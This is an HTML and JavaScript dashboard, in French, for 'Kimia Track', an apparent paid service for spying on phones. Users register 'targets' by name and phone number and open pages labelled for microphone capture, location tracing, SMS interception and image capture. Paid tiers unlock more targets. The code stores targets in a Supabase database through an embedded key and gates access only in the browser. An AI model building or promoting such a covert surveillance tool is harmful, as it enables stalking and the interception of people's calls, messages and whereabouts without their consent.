<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard - Kimia Track</title>
    <style>
        :root { 
            --primary: #38bdf8; --bg: #0f172a; --card: #1e293b; --text: #f1f5f9; 
            --accent: #eab308; --success: #22c55e; --danger: #ef4444; --shadow: rgba(0,0,0,0.3);
        }
        body { font-family: 'Segoe UI', sans-serif; background: var(--bg); color: var(--text); margin: 0; padding: 15px; padding-bottom: 90px; }
        
        .hero { text-align: center; margin-bottom: 20px; }
        .hero h1 { color: var(--primary); margin: 0; font-size: 24px; letter-spacing: 1px; }
        .hero p { font-size: 13px; opacity: 0.7; margin-top: 5px; }

        .header-app { display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; background: var(--card); padding: 15px; border-radius: 12px; box-shadow: 0 4px 6px var(--shadow); border: 1px solid #2d3a4f; }
        .session-info { font-size: 11px; color: var(--primary); letter-spacing: 1px; font-family: monospace; }
        .user-name { font-weight: bold; font-size: 18px; color: white; margin-top: 2px; }

        .badge-container { text-align: right; }
        .badge-status { font-size: 14px; font-weight: bold; padding: 4px 10px; border-radius: 6px; margin-top: 3px; display: inline-block; }
        .badge-status.demo { background: rgba(234, 179, 8, 0.15); color: var(--accent); border: 1px solid var(--accent); }
        .badge-status.gold { background: rgba(34, 197, 94, 0.15); color: var(--success); border: 1px solid var(--success); }

        .add-target-box { background: var(--card); border: 1px dashed #475569; border-radius: 12px; padding: 15px; margin-bottom: 25px; }
        .add-target-box h3 { margin: 0 0 12px 0; font-size: 14px; color: var(--primary); }
        .add-inputs { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 12px; }
        .add-inputs input { background: #0f172a; border: 1px solid #334155; border-radius: 6px; padding: 12px; color: white; width: 100%; box-sizing: border-box; }
        .btn-add-submit { background: var(--primary); color: #0f172a; border: none; padding: 12px; border-radius: 6px; font-weight: bold; cursor: pointer; width: 100%; }

        .target-grid { display: flex; flex-direction: column; gap: 14px; }
        .target-card { background: var(--card); border-radius: 14px; border: 1px solid #334155; overflow: hidden; }
        .accordion-trigger { background: rgba(30, 41, 59, 0.7); padding: 16px; display: flex; justify-content: space-between; align-items: center; cursor: pointer; }
        .status-badge { font-size: 10px; color: white; padding: 3px 9px; border-radius: 20px; font-weight: bold; }
        .accordion-content { padding: 16px; border-top: 1px solid #2d3a4f; background: #151f32; display: none; }
        
        .action-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; }
        .btn-tactic { background: #222f44; border: 1px solid #3b4b66; color: white; padding: 14px 10px; border-radius: 10px; font-size: 11px; font-weight: bold; cursor: pointer; display: flex; flex-direction: column; align-items: center; gap: 6px; }
        
        .nav-bar { position: fixed; bottom: 0; left: 0; right: 0; background: var(--card); display: flex; justify-content: space-around; padding: 15px; border-top: 1px solid #334155; z-index: 100; }
        .nav-btn { color: #94a3b8; text-decoration: none; font-size: 12px; display: flex; flex-direction: column; align-items: center; }
    </style>
</head>
<body>

    <div class="hero">
        <svg width="64" height="64" viewBox="0 0 24 24" fill="none" stroke="#38bdf8" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" style="filter: drop-shadow(0 0 8px rgba(56, 189, 248, 0.5));">
            <path d="M12 22c5.523 0 10-4.477 10-10S17.523 2 12 2 2 6.477 2 12s4.477 10 10 10z"/><path d="M12 18c3.314 0 6-2.686 6-6s-2.686-6-6-6-6 2.686-6 6 2.686 6 6 6z"/><path d="M12 14c1.105 0 2-0.895 2-2s-0.895-2-2-2-2 0.895-2 2 0.895 2 2 2z"/><path d="M12 2v4M12 18v4M2 12h4M18 12h4"/>
        </svg>
        <h1>KIMIA TRACK</h1>
        <p>Intelligence Géospatiale & Protection Civile</p>
    </div>

    <div class="header-app">
        <div><span class="session-info" id="session-id">KT-SYNC</span><div class="user-name" id="user-name">Chargement...</div></div>
        <div class="badge-status" id="account-status">VÉRIFICATION</div>
    </div>

    <div class="add-target-box">
        <h3 id="form-title">📡 Initialiser la surveillance</h3>
        <div class="add-inputs">
            <input type="text" id="nom_cible" placeholder="Nom">
            <input type="tel" id="telephone_cible" placeholder="Numéro">
        </div>
        <button class="btn-add-submit" onclick="ajouterCible()">ENREGISTRER LA CIBLE</button>
    </div>

    <div class="target-grid" id="target-container"></div>

    <nav class="nav-bar">
        <a href="aide.html" class="nav-btn"><span>❓</span>Aide</a>
        <a href="#" class="nav-btn"><span>📡</span>Radar</a>
        <a href="approvisionnement.html" class="nav-btn"><span>💰</span>Wallet</a>
        <a href="#" class="nav-btn" onclick="deconnexion()"><span>🔒</span>Quitter</a>
    </nav>

    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <script>
        const SUPABASE_URL = "https://ufwirghypzowlmeqqgco.supabase.co";
        const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InVmd2lyZ2h5cHpvd2xtZXFxZ2NvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzg5MjE5OTksImV4cCI6MjA5NDQ5Nzk5OX0.4VuibIs4KtccJ3IR8p8BRsaCeKmfLCcb0FpTrxP18JU";
        const clientSupabase = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
        const userTel = localStorage.getItem('kt_user_tel');

        if (!userTel) window.location.href = 'identification.html';

        window.onload = async () => {
            const { data: profil } = await clientSupabase.from('profils').select('*').eq('whatsapp_num', userTel).maybeSingle();
            const mode = (profil && (profil.statut_compte === "GOLD" || profil.solde_fc >= 5500)) ? "GOLD" : "DEMO";
            
            document.getElementById('user-name').innerText = profil?.nom || "Utilisateur";
            document.getElementById('account-status').innerText = `MODE ${mode}`;
            document.getElementById('account-status').className = `badge-status ${mode.toLowerCase()}`;
            
            genererEspaceCibles(mode);
        };

        async function genererEspaceCibles(mode) {
            const container = document.getElementById('target-container');
            const { data: cibles } = await clientSupabase.from('cibles').select('*').eq('user_id_proprietaire', userTel);
            
            document.getElementById('form-title').innerText = (mode === "GOLD") ? `📡 Ajouter terminal (${(cibles?.length || 0)}/8)` : "📡 Enregistrer cible (Forfait Démo)";

            container.innerHTML = (mode === "DEMO") ? `
                <div style="background:rgba(234, 179, 8, 0.1); border:1px solid var(--accent); padding:15px; border-radius:12px; text-align:center; margin-bottom:20px;">
                    <p style="color:var(--accent); font-weight:bold;">🚀 MODE DÉMO</p>
                    <a href="approvisionnement.html" style="color:white; text-decoration:underline;">Passer en GOLD pour 8 cibles illimitées</a>
                </div>` : "";

            if (cibles && cibles.length > 0) {
                cibles.forEach((c, i) => {
                    container.innerHTML += `
                        <div class="target-card">
                            <div class="accordion-trigger" onclick="toggleAccordion('c-${i}')">
                                <span>🎯 ${c.nom_cible} [${c.numero_cible}]</span>
                                <span class="status-badge" style="background:var(--success)">ACTIF</span>
                            </div>
                            <div class="accordion-content" id="c-${i}">
                                <div class="action-grid">
                                    <button class="btn-tactic" onclick="verifierAcces('captage.html?tel=${c.numero_cible}', '${mode}')"><span>🎤</span>Captage</button>
                                    <button class="btn-tactic" onclick="verifierAcces('itineraire.html?tel=${c.numero_cible}', '${mode}')"><span>🗺️</span>Tracer</button>
                                    <button class="btn-tactic" onclick="verifierAcces('smstracing.html?tel=${c.numero_cible}', '${mode}')"><span>📩</span>SMS Data</button>
                                    <button class="btn-tactic" onclick="verifierAcces('captation-image.html?tel=${c.numero_cible}', '${mode}')"><span>📸</span>Rapport</button>
                                </div>
                            </div>
                        </div>`;
                });
            }
        }

        async function ajouterCible() {
            const nom = document.getElementById('nom_cible').value;
            const tel = document.getElementById('telephone_cible').value;
            const { count } = await clientSupabase.from('cibles').select('*', {count: 'exact', head: true}).eq('user_id_proprietaire', userTel);
            const estGold = document.getElementById('account-status').innerText.includes("GOLD");
            
            if (!estGold && count >= 1) return alert("⚠️ Limite DÉMO atteinte.");
            
            await clientSupabase.from('cibles').insert([{ nom_cible: nom, numero_cible: tel, user_id_proprietaire: userTel }]);
            location.reload();
        }

        window.verifierAcces = (page, mode) => {
            const sms = parseInt(localStorage.getItem('kt_sms_demo') || 3);
            if (mode !== 'GOLD' && sms <= 0) {
                alert("⚠️ Solde épuisé.");
                window.location.href = "approvisionnement.html";
            } else {
                window.location.href = page;
            }
        };

        window.toggleAccordion = (id) => { const el = document.getElementById(id); el.style.display = (el.style.display === "block") ? "none" : "block"; };
        window.deconnexion = () => { localStorage.removeItem('kt_user_tel'); window.location.href = 'identification.html'; };
    </script>
</body>
</html>
